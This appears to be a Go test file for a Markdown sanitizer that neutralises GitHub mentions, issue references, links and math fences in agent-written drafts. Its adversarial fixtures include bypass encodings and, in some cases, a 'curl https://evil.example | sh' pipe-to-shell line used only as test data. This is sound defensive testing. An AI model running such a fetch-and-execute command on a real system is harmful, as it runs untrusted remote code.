@@ -1,0 +1,656 @@
+// SPDX-License-Identifier: Apache-2.0
+
+package sanitize
+
+import (
+	"math/rand"
+	"regexp"
+	"strings"
+	"testing"
+
+	"github.com/yuin/goldmark"
+	"github.com/yuin/goldmark/ast"
+	"github.com/yuin/goldmark/extension"
+	gmtext "github.com/yuin/goldmark/text"
+	"github.com/yuin/goldmark/util"
+)
+
+// The forms below were read off GitHub's POST /markdown (mode=gfm, context=Smana/maku) on
+// 2026-11-04: GitHub decodes entities and backslash escapes before it looks for references.
+const sha40 = "18e264e480a87e87afcb971b08cf6f854f02f188"
+
+// TestPublicExactForms pins what each form becomes: the span holds the form, nothing else changes.
+func TestPublicExactForms(t *testing.T) {
+	for _, c := range []struct{ name, in, want string }{
+		// entities: shown as written, in a span, so GitHub never decodes them
+		{"named @", "&commat;Smana", "`&commat;`Smana"},
+		{"hex @", "&#x40;Smana", "`&#x40;`Smana"},
+		{"hex @, upper X", "&#X40;Smana", "`&#X40;`Smana"},
+		{"decimal @", "&#64;Smana", "`&#64;`Smana"},
+		{"padded @", "&#064;Smana", "`&#064;`Smana"},
+		{"eight digits @", "&#00000064;Smana", "`&#00000064;`Smana"},
+		{"named #", "&num;325", "`&num;`325"},
+		{"decimal #", "&#35;325", "`&#35;`325"},
+		{"hex #", "&#x23;325", "`&#x23;`325"},
+		{"owner, named #", "Smana&num;325", "Smana`&num;`325"},
+		{"a hyphen as an entity", "GH&#45;325", "GH`&#45;`325"},
+		{"a slash as an entity", "Smana&sol;maku#325", "Smana`&sol;` `maku#325`"},
+		{"an entity inside the login", "@&#83;mana", "@`&#83;`mana"},
+		{"an email's @ as an entity", "someone&commat;evil.example", "someone`&commat;`evil.example"},
+		{"an escaped backslash before an entity", `\\&commat;Smana`, "\\\\`&commat;`Smana"},
+		{"an escaped ampersand", `\&commat;Smana`, "`&commat;`Smana"},
+		{"an invisible character as an entity", "@&#x200b;Smana", "@`&#x200b;`Smana"},
+		// the entities Text writes, and a literal one, stay
+		{"Text's own escape", "<b>", "&lt;b>"},
+		{"amp", "a &amp; b", "a &amp; b"},
+		{"a mention after a kept entity", "&amp;#325", "&amp;`#325`"},
+		// references with no entity
+		{"owner#n", "Smana#325", "`Smana#325`"},
+		{"lower owner#n", "smana#325", "`smana#325`"},
+		{"owner with a hyphen", "Smana-#325", "`Smana-#325`"},
+		{"owner after a dot", "x.Smana#325", "x.`Smana#325`"},
+		{"GH-n", "GH-325", "`GH-325`"},
+		{"gh-n", "gh-325", "`gh-325`"},
+		{"GH-n after a word and a hyphen", "x-GH-325", "x-`GH-325`"},
+		{"GH-n in brackets", "(GH-325)", "(`GH-325`)"},
+		{"owner/repo/issues/n", "Smana/maku/issues/325", "`Smana/maku/issues/325`"},
+		{"owner/repo/pull/n", "see Smana/maku/pull/325 x", "see `Smana/maku/pull/325` x"},
+		{"owner/repo/discussions/n", "Smana/maku/discussions/325", "`Smana/maku/discussions/325`"},
+		{"github.com with no scheme", "github.com/Smana/maku/issues/325", "`github.com/Smana/maku/issues/325`"},
+		{"GITHUB.com with no scheme", "GITHUB.com/Smana/maku/issues/325", "`GITHUB.com/Smana/maku/issues/325`"},
+		{"a relative issue path", "/issues/325", "`/issues/325`"},
+		{"a relative pull path", "(/pull/325)", "(`/pull/325`)"},
+		{"a relative path after a span", "`x`/issues/325", "`x` `/issues/325`"},
+		{"a relative path after a team", "@org/team/issues/325", "`@org/team` `/issues/325`"},
+		{"a word before a relative path", "x/issues/325", "x/issues/325"},
+		{"what a refused match covered: a reference", "x@smana/maku#325", "x@`smana/maku#325`"},
+		{"what a refused match covered: a path", "x@Smana/maku/issues/325", "x@`Smana/maku/issues/325`"},
+		{"what a refused match covered: a URL", "text@https://evil.example/x", "text@`https://evil.example/x`"},
+		{"what a refused match covered: an email", "x@y@evil.example", "x@`y@evil.example`"},
+		{"what a refused match covered: an owner", "math@Smana#325", "math@`Smana#325`"},
+		{"two word#n around a slash", "fix#9/fix#9", "`fix#9`/`fix#9`"},
+		{"advisory", "GHSA-4jq9-2xhw-jpx7", "`GHSA-4jq9-2xhw-jpx7`"},
+		{"cve", "CVE-2021-44228", "`CVE-2021-44228`"},
+		// commits
+		{"owner@sha", "Smana@" + sha40, "`Smana@" + sha40 + "`"},
+		{"owner@short", "Smana@18e264e", "`Smana@18e264e`"},
+		{"owner/repo@sha", "Smana/maku@" + sha40, "`Smana/maku@" + sha40 + "`"},
+		{"owner/repo@short", "Smana/maku@18e264e", "`Smana/maku@18e264e`"},
+		{"bare sha", sha40, "`" + sha40 + "`"},
+		{"bare short sha", "see 18e264e here", "see `18e264e` here"},
+		{"digits only", "8432076", "`8432076`"},
+		{"a range", "18e264e...18e264e", "`18e264e`...`18e264e`"},
+		{"emphasised sha", "_18e264e_", "_`18e264e`_"},
+		// a backslash escape is decoded first too
+		{"escaped hyphen", `GH\-325`, "`GH-325`"},
+		{"escaped hash", `Smana\#325`, "`Smana#325`"},
+		{"escaped slash", `Smana\/maku#325`, "`Smana/maku#325`"},
+		{"escaped at", `Smana\@18e264e`, "`Smana@18e264e`"},
+		{"escaped email", `foo\@evil.example`, "`foo@evil.example`"},
+		{"escaped path", `Smana/maku\/issues/325`, "`Smana/maku/issues/325`"},
+		{"a literal backslash stays and does not escape the span", `\Smana/x#7`, "\\\\`Smana/x#7`"},
+		// schemes in any case
+		{"upper scheme", "HTTP://evil.example", "`HTTP://evil.example`"},
+		{"mixed scheme", "HtTpS://evil.example", "`HtTpS://evil.example`"},
+		{"upper www", "WWW.evil.example", "`WWW.evil.example`"},
+		// runs of mentions a boundary could shadow
+		{"mentions sharing a hyphen", "@a-@b-@c-@d-@e-@f-@g-@h-@i", "`@a-` `@b-` `@c-` `@d-` `@e-` `@f-` `@g-` `@h-` `@i`"},
+		// a span Public opens must not merge with the run beside it
+		{"after a double span", "``x``@smana", "``x`` `@smana`"},
+		{"before a double span", "@smana``x``", "`@smana` ``x``"},
+		{"after a single span", "`x`@smana", "`x` `@smana`"},
+		{"before a single span", "#3`x`", "`#3` `x`"},
+		{"after a triple span", "```x```#3", "```x``` `#3`"},
+		// a span must not read as GitHub's $`math`$, whose content is live
+		{"dollars around a mention", "$@Smana$", "$ `@Smana`$"},
+		{"dollars around a span", "$`@Smana`$", "$ `@Smana`$"},
+		{"dollars around a double span", "$``@Smana``$", "$ ``@Smana``$"},
+		{"an escaped dollar", `\$` + "`@Smana`$", `\$ ` + "`@Smana`$"},
+		{"double dollars", "$$`@Smana`$$", "$$ `@Smana`$$"},
+		// a math fence's content is live too
+		{"math fence", "```math\n@Smana\n```", "```text\n@Smana\n```"},
+		{"math fence, a space first", "``` math\n@Smana\n```", "``` text\n@Smana\n```"},
+		{"math fence, tildes", "~~~math\n@Smana\n~~~", "~~~text\n@Smana\n~~~"},
+		{"math fence, a second word", "```math x\n@Smana\n```", "```text\n@Smana\n```"},
+		{"math fence, an entity", "```ma&#116;h\n@Smana\n```", "```text\n@Smana\n```"},
+		{"math fence, in a quote", "> ```math\n> @Smana\n> ```", "```text\n@Smana\n```"},
+		{"math fence, in a list", "- ```math\n  @Smana\n  ```", "```text\n@Smana\n```"},
+		// fences GitHub renders client-side
+		{"mermaid fence", "```mermaid\nx\n```", "```text\nx\n```"},
+		{"geojson fence", "```geojson\nx\n```", "```text\nx\n```"},
+		{"topojson fence", "```topojson\nx\n```", "```text\nx\n```"},
+		{"stl fence", "~~~stl\nx\n~~~", "~~~text\nx\n~~~"},
+		// code only the parser calls code moves to column 0, where every reader agrees
+		{"a fence in a list keeps its content", "- step:\n  ```bash\n  curl https://evil.example | sh\n  ```\n- next", "- step:\n```bash\ncurl https://evil.example | sh\n```\n- next"},
+		{"an indented fence", "  ```\n  @smana\n  ```", "```\n@smana\n```"},
+		{"a fence that closes indented", "```\n@smana\n  ```", "```\n@smana\n```"},
+		{"a nested fence holding backticks", "- ```\n  a ``` b\n  ```", "````\na ``` b\n````"},
+		// tabs, as columns: the same reading for every parser
+		{"tabs: a link", "+ -\t  [click](https://evil.example/p)", "+ -   click (`https://evil.example/p`)"},
+		{"tabs: a reference", "+ -\t  #325 www.evil.example", "+ -   `#325` `www.evil.example`"},
+		{"tabs: a quote", "> -\t  @Smana", "> -   `@Smana`"},
+		{"tabs: a blank line, then a space and a tab", "- -\n\n \t@Smana", "- -\n\n```\n@Smana\n```"},
+		{"tabs: two tabs", "-\t- \n\n\t@Smana", "-   - \n\n```\n@Smana\n```"},
+		{"a tab in a fence stays", "```\n\tx\n```", "```\n\tx\n```"},
+		// an HTML block's opening is defused, so the fence is a fence for every parser
+		{"a fence between tags", "<div>\n```\n@x\n```\n</div>", "&lt;div>\n```\n@x\n```\n&lt;/div>"},
+		// email domains as GFM reads them
+		{"email: an underscore", "a@b_c.example", "`a@b_c.example`"},
+		{"email: a leading dot", "a@.example", "`a@.example`"},
+		{"email: an underscore alone", "a@_.example", "`a@_.example`"},
+		{"owner/repo at a version", "Smana/maku@v1.0", "`Smana/maku@v1.0`"},
+		// what looked like a code span and is not one
+		{"across a blank line", "`a\n\n@smana b`", "\\`a\n\n`@smana` b\\`"},
+		{"across a list item", "`a\n- @smana b`", "\\`a\n- `@smana` b\\`"},
+		{"across a quote", "`a @smana b\n> c`", "\\`a `@smana` b\n> c\\`"},
+		{"across a heading", "`a\n# @smana b", "\\`a\n# `@smana` b"},
+		{"across a table's pipe", "| a | b |\n|---|---|\n| `x | @smana b` | y |", "| a | b |\n|---|---|\n| \\`x | `@smana` b\\` | y |"},
+		{"a header's pipe", "| `a | @smana b` |\n|---|---|\n| x | y |", "| \\`a | `@smana` b\\` |\n|---|---|\n| x | y |"},
+		// a longer fence shields what it holds, and its neighbours stay live
+		{"a fence inside a false span", "`a\n```\n@smana b\n```\nc @d", "\\`a\n```\n@smana b\n```\nc `@d`"},
+		{"a longer fence", "````\n```\n@smana\n```\n````\n@d", "````\n```\n@smana\n```\n````\n`@d`"},
+		{"an indented block", "    @smana", "```\n@smana\n```"},
+		{"an indented block between paragraphs", "a\n\n    @smana\n    x\n\nb", "a\n\n```\n@smana\nx\n```\n\nb"},
+		{"a fence stays as written", "```go\nx := \"@smana #1 " + sha40 + " https://evil.example\"\n```\n", "```go\nx := \"@smana #1 " + sha40 + " https://evil.example\"\n```\n"},
+		{"a table's escaped pipe keeps its span", "| a |\n|---|\n| `x \\| @smana b` |", "| a |\n|---|\n| `x \\| @smana b` |"},
+		// ordinary text
+		{"C# with no digit", "C# and F#.", "C# and F#."},
+		{"C# with a digit", "C#7", "`C#7`"},
+		{"fix#9 is a word#n like any other", "fix#9.", "`fix#9`."},
+		{"Fix#9 too", "Fix#9 here", "`Fix#9` here"},
+		{"plain words", "a b, 50% & c; 1 2 3 #; x@y; abc123 v1.2.3 12345 #fff", "a b, 50% & c; 1 2 3 #; x@y; abc123 v1.2.3 12345 #fff"},
+		{"a word before @", "a@Smana", "a@Smana"},
+		{"a word before #", "1#325", "`1#325`"},
+		{"markup stays", "## What\n\n- *a* **b** `c`\n- [ ] d\n\n> e\n\n| x |\n|---|\n| y |\n", "## What\n\n- *a* **b** `c`\n- [ ] d\n\n> e\n\n| x |\n|---|\n| y |\n"},
+		{"a span's entity stays", "`&commat;` and `&amp;`", "`&commat;` and `&amp;`"},
+		{"a span's dollar", "cost `$HOME` x", "cost `$HOME` x"},
+	} {
+		t.Run(c.name, func(t *testing.T) {
+			got, rep := Public(c.in)
+			if got != c.want {
+				t.Fatalf("Public(%q)\n got %q\nwant %q", c.in, got, c.want)
+			}
+			if rep.Withheld {
+				t.Fatalf("Public(%q) withheld", c.in)
+			}
+			assertNoLiveReference(t, c.in, got)
+		})
+	}
+}
+
+// liveRE holds the forms GitHub reads in decoded text. It is written apart from the code's pattern
+// on purpose, and is wider where that is simpler: a test that shares the pattern proves nothing.
+var liveRE = regexp.MustCompile(`(?i)(?:^|[^a-z0-9])@[a-z0-9]` +
+	`|(?:^|[^a-z0-9])#[0-9]` +
+	`|(?:^|[^a-z0-9])gh-[0-9]` +
+	`|(?:^|[^a-z0-9#@])(?-i:[0-9a-f]{7,40})(?:$|[^a-z0-9])` +
+	`|(?:^|[^a-z0-9])/(?:issues|pull|discussions)/[0-9]` +
+	`|[a-z0-9-]@[0-9a-f]{7}` +
+	`|[a-z0-9.-]+@[a-z0-9-]+\.[a-z0-9]` +
+	`|[a-z0-9_.-]+/[a-z0-9_.-]+#[0-9]` +
+	`|[a-z0-9_.-]+/[a-z0-9_.-]+/(?:issues|pull|discussions)/[0-9]` +
+	`|(?:https?|ftp)://|www\.|github\.com/` +
+	`|[a-z0-9-]#[0-9]` +
+	`|ghsa-|cve-[0-9]`)
+
+// liveTexts is each stretch of text a reader sees outside a code span, entities and escapes
+// decoded as GitHub decodes them before it looks for references. Anything that is not text ends a
+// stretch: GitHub does not read a reference across an element.
+func liveTexts(out string) []string {
+	src := []byte(out)
+	var texts []string
+	var cur strings.Builder
+	flush := func() {
+		if cur.Len() > 0 {
+			texts = append(texts, cur.String())
+			cur.Reset()
+		}
+	}
+	doc := goldmark.New(goldmark.WithExtensions(extension.GFM)).Parser().Parse(gmtext.NewReader(src))
+	_ = ast.Walk(doc, func(n ast.Node, entering bool) (ast.WalkStatus, error) {
+		switch n := n.(type) {
+		case *ast.CodeSpan:
+			if entering {
+				flush()
+			}
+			return ast.WalkSkipChildren, nil
+		case *ast.Text:
+			if entering {
+				v := util.UnescapePunctuations(n.Segment.Value(src))
+				cur.Write(util.ResolveEntityNames(util.ResolveNumericReferences(v)))
+				if n.SoftLineBreak() || n.HardLineBreak() {
+					cur.WriteByte('\n')
+				}
+			}
+		default:
+			flush()
+		}
+		return ast.WalkContinue, nil
+	})
+	flush()
+	return texts
+}
+
+// assertNoLiveReference is the property Public promises, read back from its output.
+func assertNoLiveReference(t *testing.T, in, out string) {
+	t.Helper()
+	if l := links(out); len(l) != 0 {
+		t.Errorf("Public(%q): %v survived in %q", in, l, out)
+	}
+	for _, text := range liveTexts(out) {
+		if m := liveRE.FindString(text); m != "" {
+			t.Errorf("Public(%q): %q is live in %q (text %q)", in, m, out, text)
+		}
+	}
+	src := []byte(out)
+	_ = ast.Walk(parseGFM(out), func(n ast.Node, entering bool) (ast.WalkStatus, error) {
+		if !entering {
+			return ast.WalkContinue, nil
+		}
+		switch n := n.(type) {
+		case *ast.CodeSpan:
+			start, stop, ok := spanRange(n, src)
+			if !ok {
+				t.Errorf("Public(%q): a code span without a range in %q", in, out)
+			} else if start > 0 && stop < len(src) && src[start-1] == '$' && src[stop] == '$' {
+				t.Errorf("Public(%q): a span reads as math in %q", in, out)
+			}
+		case *ast.FencedCodeBlock:
+			if lang := string(n.Language(src)); strings.EqualFold(lang, "math") {
+				t.Errorf("Public(%q): a math fence survived in %q", in, out)
+			}
+		}
+		return ast.WalkContinue, nil
+	})
+}
+
+// The property over every position a form can sit in: whatever surrounds it, Public's output holds
+// no link node and no reference form outside a code span. The forms are the reported bypasses, the
+// surroundings each thing that once shielded or unshielded one.
+func TestPublicLeavesNothingLive(t *testing.T) {
+	forms := []string{
+		"@smana", "@org/team", "#325", "Smana#325", "Smana/maku#325", "GH-325", "gh-325",
+		"Smana/maku/issues/325", "Smana/maku/pull/325", "github.com/Smana/maku/issues/325",
+		"Smana@" + sha40, "Smana@18e264e", "Smana/maku@" + sha40, "Smana/maku@18e264e", sha40, "18e264e", "8432076",
+		"&commat;Smana", "&#x40;Smana", "&#X40;Smana", "&#64;Smana", "&#064;Smana", "&#0000064;Smana", "&#00000064;Smana",
+		"&num;325", "&#35;325", "&#x23;325", "&#X23;325", "&#035;325", "Smana&num;325", "Smana&#35;325", "GH&#45;325",
+		"Smana&commat;" + sha40, "Smana&#64;18e264e", "&amp;#35;325", "&amp;#325", "&#38;#35;325", "&#38;num;325",
+		`\@smana`, `\#325`, `GH\-325`, `Smana\#325`, `Smana\/maku#325`, `Smana\@18e264e`,
+		"https://evil.example/x", "HTTP://evil.example", "www.evil.example", "WWW.evil.example", "ftp://evil.example",
+		"someone@evil.example", "someone&commat;evil.example", `someone\@evil.example`,
+		"[a](https://evil.example/x)", "[@smana](x)", "[a](x \"@smana\")", "[`x`](https://evil.example/x)", "[a](<https://evil.example/x y>)",
+		"<https://evil.example/x>", "<a href=x>", "![a](https://evil.example/x)", "[a][r]\n\n[r]: https://evil.example/x",
+		"GHSA-4jq9-2xhw-jpx7", "CVE-2021-44228",
+	}
+	around := []struct{ before, after string }{
+		{"", ""},
+		{"see ", " here"},
+		{"(", ")."},
+		{"_", "_"},
+		{"*", "*"},
+		{"**", "**"},
+		{"~~", "~~"},
+		{"$", "$"},
+		{"$`", "`$"},
+		{"\\", ""},
+		{"\\\\", ""},
+		{"\\\\\\", "\\"},
+		{"`", ""},
+		{"", "`"},
+		{"``", ""},
+		{"`x`", ""},
+		{"", "`x`"},
+		{"``x``", ""},
+		{"", "``x``"},
+		{"```x```", "```x```"},
+		{"`x` ", " ``y``"},
+		{"[", "]"},
+		{"[l](", ")"},
+		{"[", "](u)"},
+		{"# ", ""},
+		{"## ", " ##"},
+		{"> ", ""},
+		{"- ", ""},
+		{"1. ", ""},
+		{"- [ ] ", ""},
+		{"x\n===\n", ""},
+		{"", "\n==="},
+		{"| a |\n|---|\n| ", " |"},
+		{"| ", " |\n|---|\n| x |"},
+		{"| a | b |\n|---|---|\n| `x | ", " b` | y |"},
+		{"`a\n\n", " b`"},
+		{"`a\n- ", " b`"},
+		{"`a ", " b\n> c`"},
+		{"`a\n# ", " b`"},
+		{"``a\n\n", "``"},
+		{"```\nx\n```\n", "\n```\ny\n```"},
+		{"```math\n", "\n```"},
+		{"~~~ math\n", "\n~~~"},
+	}
+	for _, f := range forms {
+		for _, a := range around {
+			in := a.before + f + a.after
+			out, rep := Public(in)
+			if rep.Withheld {
+				t.Errorf("Public(%q): withheld: nothing here should need it", in)
+			}
+			assertNoLiveReference(t, in, out)
+			// The fixpoint: another pass finds nothing.
+			if again := inertPass(out); again != out {
+				t.Errorf("Public(%q) is not stable:\n once  %q\n twice %q", in, out, again)
+			}
+		}
+	}
+}
+
+// soup is a text of n tokens picked by seed: markup that opens or closes something, next to forms
+// that must not end up live. It finds the arrangements no table thought of.
+func soup(seed int64, n int) string {
+	tokens := []string{
+		"`", "``", "```", "````", "~~~", "\\", "\\\\", "$", "$$", "&", "&amp;", "&lt;", "&#64;", "&commat;", "&num;", "&#35;",
+		"|", "\\|", "|---|", "\n", "\n", "\n\n", " ", " ", " ", "    ", "> ", "- ", "1. ", "# ", "===", "---", "***", "*", "_", "**", "~~",
+		"[", "]", "](", "(", ")", "<", ">", "!", "!\\[", ":", "]:", ".", "/", "-", "@", "#", "=",
+		"@smana", "#325", "Smana#325", "GH-325", "Smana/maku#325", "18e264e", "8432076", "Smana@18e264e", "Smana/maku/issues/325",
+		"https://evil.example/x", "www.evil.example", "a@evil.example", "fix#9", "C#", "word", "x", "math", "```math\n", "text",
+	}
+	r := rand.New(rand.NewSource(seed)) //nolint:gosec // a reproducible test corpus
+	var b strings.Builder
+	for range n {
+		b.WriteString(tokens[r.Intn(len(tokens))])
+	}
+	return b.String()
+}
+
+// The same property over arrangements nobody wrote down. Seeded, so a failure reproduces.
+func TestPublicLeavesNothingLiveInASoup(t *testing.T) {
+	for seed := range int64(1000) {
+		in := soup(seed, 8+int(seed%60))
+		out, rep := Public(in)
+		if rep.Withheld {
+			if out != Withheld {
+				t.Errorf("Public(%q): withheld, yet %q", in, out)
+			}
+			continue // a soup is hostile by design: refusing one is the fail-closed answer
+		}
+		assertNoLiveReference(t, in, out)
+		if again := inertPass(out); again != out {
+			t.Errorf("Public(%q) is not stable:\n once  %q\n twice %q", in, out, again)
+		}
+	}
+}
+
+// What the parsers read differently, reported by an independent review: goldmark drops or hides the
+// text, so the rewrite cannot reach it, and the last scan, which does not use goldmark, refuses it.
+func TestPublicWithholdsWhatTheParsersDisagreeOn(t *testing.T) {
+	for _, in := range []string{
+		"- | a |\n|---|\n| x | [click](https://evil.example/p) #325 Smana/maku#325 |",
+		"> | a |\n|---|\n| x | @Smana |",
+		"| a |\n|---|\n    x\ny | @Smana",
+		"| a |\n|---|\n\tx\ny | @Smana",
+		"| a |\n|---|\n    x\ny | [click](https://evil.example/p)",
+		"| a |\n|---|\n\tx\ny | [click](https://evil.example/p)",
+		"```\n@x",          // an unclosed fence would swallow the caller's footer
+		"text\n\n~~~go\nx", // with tildes too
+	} {
+		if out, rep := Public(in); out != Withheld || !rep.Withheld {
+			t.Errorf("Public(%q) = %q, %+v, want it withheld", in, out, rep)
+		}
+	}
+}
+
+// Fences as CommonMark reads them: a closer may sit behind up to three spaces, and any fence, even
+// an empty one, gets the same handling. The first two came through a review, live on GitHub.
+func TestPublicReadsAFenceAsCommonMarkDoes(t *testing.T) {
+	for _, c := range []struct{ name, in, want string }{
+		{"a table after an indented closer", "```\n  ```\n- | a |\n|---|\n| x | [click](https://evil.example/p) #325 @Smana |\n```", Withheld},
+		{"a table after an indented closer, tildes", "~~~\n  ~~~\n> | a |\n|---|\n| x | www.evil.example Smana/maku#325 |\n~~~", Withheld},
+		{"the same, the last fence closed", "```\n  ```\n- | a |\n|---|\n| x | @Smana |\n```\n```", Withheld},
+		{"an empty fence closed indented moves", "```\n  ```\n\n@x", "```\n```\n\n`@x`"},
+		{"an empty fence closed 3 spaces in", "~~~\n   ~~~\n\n@x", "```\n```\n\n`@x`"},
+		{"an empty indented fence moves", "  ```\n  ```\n\n@x", "```\n```\n\n`@x`"},
+		{"an empty nested fence moves", "- ```\n  ```\n\n@x", "```\n```\n\n`@x`"},
+		{"an empty indented fence left open is closed", "text\n\n  ```", "text\n\n```\n```"},
+		{"an empty column-0 fence closed there stays", "```\n```\n\n@x", "```\n```\n\n`@x`"},
+		// open by CommonMark's rules, so the caller's footer would land inside it
+		{"open: nothing after it", "text\n```", Withheld},
+		{"open: four spaces is no closer", "```\nx\n    ```", Withheld},
+		{"open: a tab is no closer", "```\nx\n\t```", Withheld},
+		{"open: a closer with words is no closer", "```\nx\n``` y", Withheld},
+		{"open: a shorter run is no closer", "````\nx\n```", Withheld},
+		{"open: the other character is no closer", "~~~\nx\n```", Withheld},
+		{"open: closed, then opened again", "```\nx\n```\n```\ny", Withheld},
+		// the same with nothing wrong
+		{"a closer with spaces after it", "```\nx\n```  ", "```\nx\n```  "},
+		{"a longer closer", "```\nx\n`````", "```\nx\n`````"},
+	} {
+		t.Run(c.name, func(t *testing.T) {
+			got, rep := Public(c.in)
+			if got != c.want {
+				t.Fatalf("Public(%q)\n got %q\nwant %q", c.in, got, c.want)
+			}
+			if rep.Withheld != (c.want == Withheld) {
+				t.Fatalf("Public(%q): %+v", c.in, rep)
+			}
+		})
+	}
+}
+
+// commonMarkCloser is a line CommonMark reads as closing a fence of n of char, written apart from
+// the code's reading of one.
+func commonMarkCloser(char byte, n int) *regexp.Regexp {
+	return regexp.MustCompile("^ {0,3}" + strings.Repeat(string(char), n) + string(char) + "*[ \t]*$")
+}
+
+// fenceLines are lines of nothing but fences, indents and a form: the arrangements that test where a
+// fence ends.
+func fenceLines(seed int64) string {
+	lines := []string{
+		"```", "````", "`````", "~~~", "~~~~", " ```", "  ```", "   ```", "    ```", "\t```", " \t```", " ~~~", "   ~~~", "    ~~~", "\t~~~",
+		"``` x", "~~~ x", "```math", "```  ", "~~~\t", "", "x", "@x", "| a |", "|---|", "| x | @x |", "- | a |", "> | a |",
+	}
+	r := rand.New(rand.NewSource(seed)) //nolint:gosec // a reproducible test corpus
+	var out []string
+	for range 2 + r.Intn(10) {
+		out = append(out, lines[r.Intn(len(lines))])
+	}
+	return strings.Join(out, "\n")
+}
+
+// A reviewer's finding as a property: no fence the scan trusts holds a line CommonMark would read as
+// its closer. And the two things that follow from CommonMark's own reading of these lines, walked
+// here without the scan: a fence left open is refused, and a form outside every fence is live.
+func TestScanTrustsNoFenceCommonMarkWouldClose(t *testing.T) {
+	opener := regexp.MustCompile("^ {0,3}(`{3,}|~{3,})(.*)$")
+	check := func(t *testing.T, s string) {
+		t.Helper()
+		live, fences := scanFences(s)
+		lines := strings.Split(s, "\n")
+		for _, f := range fences {
+			head := opener.FindStringSubmatch(lines[f.first])
+			if head == nil || f.last <= f.first {
+				t.Fatalf("scanFences(%q): %+v is no fence", s, f)
+			}
+			closer := commonMarkCloser(head[1][0], len(head[1]))
+			if !closer.MatchString(lines[f.last]) {
+				t.Errorf("scanFences(%q): %+v does not end on a closer", s, f)
+			}
+			for _, l := range lines[f.first+1 : f.last] {
+				if closer.MatchString(l) {
+					t.Errorf("scanFences(%q): %+v holds %q, which closes it", s, f, l)
+				}
+			}
+		}
+		// CommonMark's walk of a document with no container above the fences.
+		if strings.Contains(s, "- |") || strings.Contains(s, "> |") {
+			return
+		}
+		var open *regexp.Regexp
+		formOutside := false
+		for _, l := range lines {
+			switch {
+			case open != nil:
+				if open.MatchString(l) {
+					open = nil
+				}
+			default:
+				if h := opener.FindStringSubmatch(l); h != nil && (h[1][0] != '`' || !strings.Contains(h[2], "`")) {
+					open = commonMarkCloser(h[1][0], len(h[1]))
+				} else if strings.Contains(strings.ReplaceAll(l, "`@x`", ""), "@x") { // the span Public writes shields it
+					formOutside = true
+				}
+			}
+		}
+		if open != nil && !live {
+			t.Errorf("scanLive(%q) = false, yet CommonMark leaves a fence open", s)
+		}
+		if formOutside && !live {
+			t.Errorf("scanLive(%q) = false, yet CommonMark reads a form outside every fence", s)
+		}
+	}
+	for seed := range int64(5000) {
+		s := fenceLines(seed)
+		check(t, s)
+		out, rep := Public(s)
+		if !rep.Withheld {
+			check(t, out)
+		}
+	}
+	// Soups hold fences in positions no line list reaches.
+	for seed := range int64(500) {
+		check(t, soup(seed, 8+int(seed%60)))
+	}
+}
+
+// A draft as an agent writes one is published: what the last scan refuses must not be ordinary text.
+func TestPublicKeepsAnOrdinaryDraft(t *testing.T) {
+	in := "## What is wrong\n" +
+		"The rule in `alerts/job.yaml` fires on #12, see https://example.com/runbook and [the doc](https://example.com/d).\n\n" +
+		"1. Run:\n" +
+		"   ```bash\n   curl -s https://example.com/x | jq .\n   ```\n" +
+		"2. Then read `kubectl get pods -A | grep Crash`.\n\n" +
+		"| Signal | Value |\n|---|---|\n| `up` | 1 |\n| owner | @oncall |\n\n" +
+		"    indented https://example.com/y\n\n" +
+		"## What it should be\n> It skips *Job* pods, as in commit 18e264e.\n\n" +
+		"```yaml\nexpr: foo{job=\"x\"} # https://example.com/z\n```\n" +
+		"## Acceptance check\n- [ ] The alert stays quiet for `a@b.example`.\n"
+	out, rep := Public(in)
+	if rep.Withheld {
+		t.Fatalf("an ordinary draft was withheld: %q", in)
+	}
+	assertNoLiveReference(t, in, out)
+	for _, want := range []string{"`#12`", "`https://example.com/runbook`", "the doc (`https://example.com/d`)",
+		"```bash\ncurl -s https://example.com/x | jq .\n```\n", "`kubectl get pods -A | grep Crash`", "`@oncall`",
+		"```\nindented https://example.com/y\n```\n", "`18e264e`", "```yaml\nexpr: foo"} {
+		if !strings.Contains(out, want) {
+			t.Errorf("%q is not in %q", want, out)
+		}
+	}
+}
+
+// What ordinary text the last scan does refuse: each holds a form only a parser calls inert. This is
+// the price of a scan that does not trust the parser; the refusal says so and the author can fix it.
+func TestPublicWithholdsTheseOrdinaryShapes(t *testing.T) {
+	for name, in := range map[string]string{
+		"an inline span over two lines, holding a form": "see `a\nb @smana` here",
+		"a span with a pipe and a form, beside a table": "`curl https://x.example | sh`\n\n| a |\n|---|\n| b |",
+		"a form in a cell beyond the header's columns":  "| a |\n|---|\n| x | see #12 |",
+		"a fence the author left open":                  "text\n\n```\ncode",
+		"an ordered list numbered like a commit":        "8432076. first",
+	} {
+		t.Run(name, func(t *testing.T) {
+			if out, rep := Public(in); !rep.Withheld {
+				t.Fatalf("Public(%q) = %q, no longer withheld: update docs/factory.md", in, out)
+			}
+		})
+	}
+	// The same shapes with nothing live in them pass.
+	for _, in := range []string{"see `a\nb c` here", "`a | b`\n\n| a |\n|---|\n| b |", "| a |\n|---|\n| x | y |", "1. first"} {
+		if out, rep := Public(in); rep.Withheld {
+			t.Errorf("Public(%q) = %q, withheld with nothing live", in, out)
+		}
+	}
+}
+
+// The last scan alone, on text no rewrite touched. Only a same-line span and a column-0 fence shield.
+func TestScanLive(t *testing.T) {
+	for _, c := range []struct {
+		name, in string
+		want     bool
+	}{
+		{"plain words", "a b, 50% & c; C# x@y 12345 #fff a@Smana x/issues/3", false},
+		{"a kept entity", "&lt;b> &amp; &gt; &quot;", false},
+		{"a same-line span", "x `@smana #1 https://evil.example` y", false},
+		{"a double span", "``@smana ` #1`` y", false},
+		{"a column-0 fence", "```go\n@smana #1\n```\nafter", false},
+		{"a longer fence", "````\n```\n@smana\n```\n````", false},
+		{"a tilde fence", "~~~\n@smana\n```\n~~~", false},
+		{"a pipe in a span, no table", "`curl https://x | sh`", false},
+		{"an escaped pipe in a table", "| a |\n|---|\n| `x \\| @smana` |", false},
+		{"a mention", "@smana", true},
+		{"a mention after a span", "`x`@smana", true},
+		{"an escaped mention", `\@smana`, true},
+		{"#n", "see #1", true},
+		{"owner#n", "Smana#325", true},
+		{"fix#n", "fix#9", true},
+		{"GH-n", "gh-325", true},
+		{"x@sha", "Smana@18e264e", true},
+		{"a bare sha", "see 18e264e.", true},
+		{"digits", "8432076", true},
+		{"an issue path", "/issues/325", true},
+		{"a repository's issue path", "Smana/maku/pull/3", true},
+		{"a link", "[a](b)", true},
+		{"an angle autolink", "<https://evil.example>", true},
+		{"an angle mailto", "<mailto:a@b.example>", true},
+		{"a URL", "HTTPS://evil.example", true},
+		{"www", "www.evil.example", true},
+		{"github.com", "github.com/a/b", true},
+		{"an email", "a@b_c.example", true},
